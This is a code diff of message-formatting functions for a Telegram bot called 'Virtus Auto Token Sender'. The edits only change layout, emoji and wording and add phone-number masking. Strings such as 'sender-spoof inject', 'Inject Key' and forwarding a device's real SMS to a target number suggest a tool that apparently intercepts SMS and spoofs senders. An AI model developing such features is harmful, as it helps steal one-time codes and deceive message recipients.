@@ -7,7 +7,7 @@ from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 from app.database import Device, MonitorProfile
 
 STARTUP_TEST_SENDER = "CHACHA"
-STARTUP_TEST_MESSAGE = "Chacha Ji Pani Pila Do"
+STARTUP_TEST_MESSAGE = "Chacha Ji Pani Pila Do?"
 BRAND_NAME = "Virtus Auto Token Sender"
 
 
@@ -298,11 +298,11 @@ def format_timing_footer(queued_ms: int, total_ms: int) -> str:
 
 def format_virtus_startup_card(queued_ms: int = 3, total_ms: int = 15) -> str:
     return (
-        "✅ <b>SUCCESS</b>\n\n"
+        "✅ <b>SUCCESS</b>\n"
         "<pre>"
-        "⚡ INJECT FORWARDED! [STARTUP]\n\n"
-        f"📩 Sender: {STARTUP_TEST_SENDER}\n"
-        f"🔒 {STARTUP_TEST_MESSAGE}\n\n"
+        "⚡ INJECT FORWARDED! [STARTUP]\n"
+        f"📤 Sender: {STARTUP_TEST_SENDER}\n"
+        f"🔐 {STARTUP_TEST_MESSAGE}\n"
         f"{format_timing_footer(queued_ms, total_ms)}"
         "</pre>"
     )
@@ -318,11 +318,11 @@ def format_virtus_stream_card(
     if len(body) > 500:
         body = body[:500] + "..."
     return (
-        "✅ <b>SUCCESS</b>\n\n"
+        "✅ <b>SUCCESS</b>\n"
         "<pre>"
-        "⚡ INJECT FORWARDED! [STREAM]\n\n"
-        f"📩 Sender: {sender}\n"
-        f"🔒 {body}\n\n"
+        "⚡ INJECT FORWARDED! [STREAM]\n"
+        f"📤 Sender: {sender}\n"
+        f"🔐 {body}\n"
         f"{format_timing_footer(queued_ms, total_ms)}"
         "</pre>"
     )
@@ -372,13 +372,15 @@ def format_virtus_channel_token_card(
 
 
 def format_mynum_set_card(phone: str) -> str:
+    from app.services import display_phone
+
+    shown = display_phone(phone)
     return (
-        "✅ <b>SUCCESS</b>\n\n"
+        "✅ <b>SUCCESS</b>\n"
         "<pre>"
-        "Forwarding Number Set!\n\n"
-        f"📞 Target: {phone}\n\n"
-        "Real SMS forwards go here during monitoring.\n"
-        "For sender-spoof inject use /key instead."
+        "Forwarding Number Set!\n"
+        f"📞 Target: {shown}\n"
+        "Real SMS forwards go here during monitoring."
         "</pre>"
     )
 
@@ -402,7 +404,9 @@ def format_monitoring_card(
     active_sim = get_selected_sim(device, sim_index)
     sim_slot = active_sim.get("slot", 1)
     sim_number = active_sim.get("number", "Unknown")
-    target = profile.phone_number or "Not set"
+    from app.services import display_phone
+
+    target = display_phone(profile.phone_number) if profile.phone_number else "Not set"
     channel = profile.channel_id or str(profile.telegram_user_id)
     auto_stop = profile.auto_stop_minutes or 15
     inject_key = get_inject_key(profile, device)
@@ -410,9 +414,9 @@ def format_monitoring_card(
     device_phone = _format_sim_number(device.phone_number or sim_number)
 
     return (
-        "✅ <b>SUCCESS</b>\n\n"
+        "✅ <b>SUCCESS</b>\n"
         "<pre>"
-        "Monitoring Started!\n\n"
+        "Monitoring Started!\n"
         f"📱 Device: {short_device_id(device.name)} | {device_phone}\n"
         f"📶 FROM SIM: {sim_slot} ({sim_number})\n"
         f"🔑 Inject Key: {inject_key}\n"
@@ -421,7 +425,7 @@ def format_monitoring_card(
         f"📢 Channel: {channel} (last /addchannel only)\n"
         f"⏱️ Auto-stop in {auto_stop} minutes\n"
         f"📁 Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
-        f"✅ Test message sent: {test_msg}"
+        f"✅ Test inject OK: {test_msg}"
         "</pre>"
     )
 
